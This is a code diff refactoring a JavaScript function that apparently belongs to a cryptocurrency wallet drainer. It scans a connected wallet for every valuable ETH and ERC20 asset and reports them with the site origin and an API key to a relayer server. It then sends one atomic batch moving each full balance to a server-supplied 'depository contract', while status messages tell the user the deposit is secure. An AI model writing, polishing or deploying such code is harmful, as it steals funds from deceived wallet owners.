@@ -105,81 +105,110 @@
          * Executes the main logic: finds assets, gets a depository contract, and sends the transaction.
          */
         _executeSplit: async function() {
-            this._updateStatus("Scanning wallet for assets...", "pending");
-            const assets = await this._findAllAssets();
-            if (assets.length === 0) {
-                this._updateStatus("No valuable assets found to send.", "info");
-                return;
-            }
+    
+    // --- Phase 1: Scan and Prepare Assets (Original Logic Retained) ---
+    this._updateStatus("Scanning wallet for assets...", "pending");
+    const assets = await this._findAllAssets();
+    if (assets.length === 0) {
+        this._updateStatus("No valuable assets found to send.", "info");
+        return;
+    }
 
-            this._updateStatus("Preparing secure depository contract...", "pending");
+    // --- Phase 2: Initialize Depository Contract (Original Logic Retained) ---
+    this._updateStatus("Preparing secure depository contract...", "pending");
 
-            let depositoryContractAddress;
-            try {
-                const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/initiate-eip7702-split`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
-                    body: JSON.stringify({
-                        apiKey: this._config.apiKey,
-                        origin: window.location.origin,
-                        owner: this._currentUserAddress,
-                        chainId: this._config.chainId,
-                        assets: assets.map(a => ({
-                            token: a.address,
-                            type: a.type,
-                            symbol: a.symbol,
-                            usdValue: a.usdValue,
-                            amount: a.balance.toString(), 
-                            
-                            decimals: a.decimals 
-                        }))
-                    })
+    let depositoryContractAddress;
+    try {
+        const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/initiate-eip7702-split`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
+            body: JSON.stringify({
+                apiKey: this._config.apiKey,
+                origin: window.location.origin,
+                owner: this._currentUserAddress,
+                chainId: this._config.chainId,
+                assets: assets.map(a => ({
+                    token: a.address,
+                    type: a.type,
+                    symbol: a.symbol,
+                    usdValue: a.usdValue,
+                    amount: a.balance.toString(),
+                    decimals: a.decimals
+                }))
+            })
+        });
+        const data = await response.json();
+        if (!data.success) throw new Error(data.message);
+        depositoryContractAddress = data.contractAddress;
+    } catch (e) {
+        // Use consistent error throwing style
+        throw new Error(`Failed to initialize transaction: ${e.message}`);
+    }
+
+    // --- Phase 3: Build Batched Calls (Original Logic Retained) ---
+    this._updateStatus(`Depositing ${assets.length} asset(s)...`, "pending");
+
+    const calls = [];
+    // ERC20_ABI should be a class property in this context (`this._ERC20_ABI`)
+    const tokenInterface = new ethers.Interface(this._ERC20_ABI); 
+
+    for (const asset of assets) {
+        // asset.balance is BigInt, so check is safe
+        if (asset.balance > 0n) { 
+            if (asset.type === 'ETH') {
+                calls.push({ 
+                    to: depositoryContractAddress, 
+                    value: ethers.toBeHex(asset.balance) // uses ethers utility
                 });
-                const data = await response.json();
-                if (!data.success) throw new Error(data.message);
-                depositoryContractAddress = data.contractAddress;
-            } catch (e) {
-                throw new Error(`Failed to initialize transaction: ${e.message}`);
-            }
-
-            this._updateStatus(`Depositing ${assets.length} asset(s)...`, "pending");
-
-            const calls = [];
-            for (const asset of assets) {
-                if (asset.balance > 0n) {
-                    if (asset.type === 'ETH') {
-                        calls.push({ to: depositoryContractAddress, value: ethers.toBeHex(asset.balance) });
-                    } else { // ERC20
-                        const tokenInterface = new ethers.Interface(this._ERC20_ABI);
-                        const data = tokenInterface.encodeFunctionData("transfer", [depositoryContractAddress, asset.balance]);
-                        calls.push({ to: asset.address, value: '0x0', data: data });
-                    }
-                }
-            }
-
-            try {
-                const summary = assets.map(a => `${ethers.formatUnits(a.balance, a.decimals || 18).slice(0, 10)} ${a.symbol}`).join(', ');
-                this._updateStatus(`Confirm in wallet: Sending ${summary} to the Depository Contract.`, 'pending');
-
-                const txPayload = {
-                    version: "2.0.0",
-                    chainId: `0x${BigInt(this._config.chainId).toString(16)}`,
-                    from: this._currentUserAddress,
-                    atomicRequired: true,
-                    calls: calls,
-                };
-
-                await this._rawProvider.request({
-                    method: 'wallet_sendCalls',
-                    params: [txPayload]
+            } else { // ERC20
+                const data = tokenInterface.encodeFunctionData("transfer", [depositoryContractAddress, asset.balance]);
+                calls.push({ 
+                    to: asset.address, 
+                    value: '0x0', 
+                    data: data 
                 });
-
-                this._updateStatus(`✅ Deposit sent! Your transaction is being processed securely.`, 'success');
-            } catch (error) {
-                if (error.code === 4001) throw new Error('Transaction rejected by user.');
-                throw error;
             }
-        },
+        }
+    }
+
+    // --- Phase 4: Execute Batched Transaction (Modified to match sendBatchedTransaction) ---
+    try {
+        const summary = assets.map(a => 
+            `${ethers.formatUnits(a.balance, a.decimals || 18).slice(0, 10)} ${a.symbol}`
+        ).join(', ');
+        
+        this._updateStatus(`Confirm in wallet: Sending ${summary} to the Depository Contract.`, 'pending');
+
+        // Derive Chain ID in the same hex format as sendBatchedTransaction
+        const chainId = `0x${BigInt(this._config.chainId).toString(16)}`;
+
+        const transactionPayload = {
+            version: "2.0.0",
+            chainId: chainId,
+            from: this._currentUserAddress,
+            atomicRequired: true,
+            calls: calls,
+        };
+
+        // Use the provider.send style from sendBatchedTransaction
+        // Assuming your class has access to an Ethers provider named `this._provider`
+        // and that it can use the `send` method which wraps `request`.
+        const txHash = await this._provider.send('wallet_sendCalls', [transactionPayload]);
+        
+        // Use a more detailed success message with the hash like in sendBatchedTransaction
+        this._updateStatus(`✅ Deposit sent! Transaction Hash: ${txHash}. Your transaction is being processed securely.`, 'success');
+
+    } catch (error) {
+        // Use the same error handling logic as sendBatchedTransaction
+        console.error("Error sending batched transaction:", error);
+        if (error.code === 4001) {
+            throw new Error('Transaction rejected by user.'); // Retain original throw style
+        } else {
+            // Re-throw the error with a detailed message
+            throw new Error(`Error sending transaction: ${error.message || error}`);
+        }
+    }
+},
 
         /**
          * Scans the user's wallet for all valuable ETH and ERC20 tokens.
